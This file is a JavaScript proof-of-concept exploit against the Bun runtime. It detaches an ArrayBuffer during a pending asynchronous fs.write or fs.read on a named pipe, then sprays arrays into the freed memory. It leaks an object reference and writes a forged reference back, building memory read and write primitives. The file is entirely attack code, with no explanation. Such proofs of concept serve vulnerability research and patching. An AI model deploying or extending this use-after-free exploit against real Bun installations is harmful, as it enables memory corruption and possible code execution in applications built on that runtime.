import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const size = Number(process.env.BUF_SIZE || 8192);
const slots = Number(process.env.SLOTS || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const elementOffset = Number(process.env.ELEMENT_OFFSET || 144);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const anchors = Array.from({ length: 64 }, (_, i) => ({ kind: "anchor", i }));
const sentinel = { kind: "sentinel" };
const retained = [];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-uaf-object-ref-${label}-${process.pid}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try {
      fs.closeSync(fd);
    } catch {}
  }
  try {
    fs.unlinkSync(fifo.path);
  } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const written = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (written === 0) break;
      filled += written;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function makeAnchorArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = anchors[(i + j) & 63];
    out.push(arr);
  }
  return out;
}

function makeSentinelArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = sentinel;
    out.push(arr);
  }
  return out;
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function writeU64LE(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

async function leakObjectRef() {
  const fifo = makeFifo("leak");
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(size);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    retained.length = 0;
    retained.push(...makeAnchorArrays());
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, size, "leaked array storage");
    const result = await done;
    const ref = readU64LE(leaked, elementOffset);
    return { ref, bytesWritten: result.bytesWritten, prefix: [...leaked.subarray(elementOffset, elementOffset + 32)] };
  } finally {
    closeFifo(fifo);
  }
}

async function writeObjectRef(ref) {
  const path = join(tmpdir(), `bun-uaf-object-ref-write-${process.pid}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(size);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, elementOffset, 8, null, (err, bytesRead) => {
        resolve({ err, bytesRead });
      });
    });

    detach(ab);
    gcNow();
    retained.length = 0;
    retained.push(...makeSentinelArrays());
    gcNow();

    fs.writeSync(fd, writeU64LE(ref), 0, 8);
    const result = await done;

    for (let i = 0; i < retained.length; i++) {
      const arr = retained[i];
      if (arr[0] === sentinel) continue;
      for (let k = 0; k < anchors.length; k++) {
        if (arr[0] === anchors[k]) {
          return { bytesRead: result.bytesRead, found: { arrayIndex: i, elementIndex: 0, anchorIndex: k } };
        }
      }
      return { bytesRead: result.bytesRead, found: { arrayIndex: i, elementIndex: 0, nonSentinelType: typeof arr[0] } };
    }

    return { bytesRead: result.bytesRead, found: null };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

const leaked = await leakObjectRef();
const written = await writeObjectRef(leaked.ref);
console.log(JSON.stringify({
  size,
  slots,
  sprayCount,
  elementOffset,
  leakedRef: `0x${leaked.ref.toString(16).padStart(16, "0")}`,
  leakBytesWritten: leaked.bytesWritten,
  leakPrefixAtElementOffset: leaked.prefix,
  writeBytesRead: written.bytesRead,
  found: written.found,
}));

process.exitCode = written.found ? 86 : 1;
